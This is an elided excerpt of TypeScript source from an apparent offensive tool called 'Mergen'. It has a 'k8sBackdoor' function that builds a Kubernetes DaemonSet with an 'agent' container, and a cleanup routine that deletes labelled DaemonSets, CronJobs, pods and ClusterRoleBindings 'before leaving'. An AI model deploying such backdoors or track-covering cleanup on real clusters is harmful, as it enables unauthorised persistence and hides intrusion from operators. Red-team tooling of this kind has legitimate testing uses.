...
const PROGRAMS = {
  ...
  cleanup_k8s: {
    description:
      "Remove all Mergen-created Kubernetes resources (by label app=mergen): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
...
async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (type === "daemonset") {
    ...
    const manifest = JSON.stringify({
      apiVersion: "apps/v1",
      kind: "DaemonSet",
      metadata: { name, namespace: ns, labels: { app: "mergen" } },
      spec: {
        selector: { matchLabels: { app: "mergen", component: name } },
        template: {
          metadata: { labels: { app: "mergen", component: name } },
          spec: {
            containers: [
              {
                name: "agent",
...
async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
  ...
  const output: string[] = [
    dryRun
      ...
      : "[*] Cleaning up Mergen Kubernetes resources...\n",
  ]
  let cleaned = 0

  const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
  for (const res of resources) {
    const list = await kc(["get", res, "--all-namespaces", "-l", "app=mergen"], kubeconfig, ctx, timeout)
  ...
  const crbs = await kc(["get", "clusterrolebindings", "-l", "app=mergen"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      if (dryRun) {
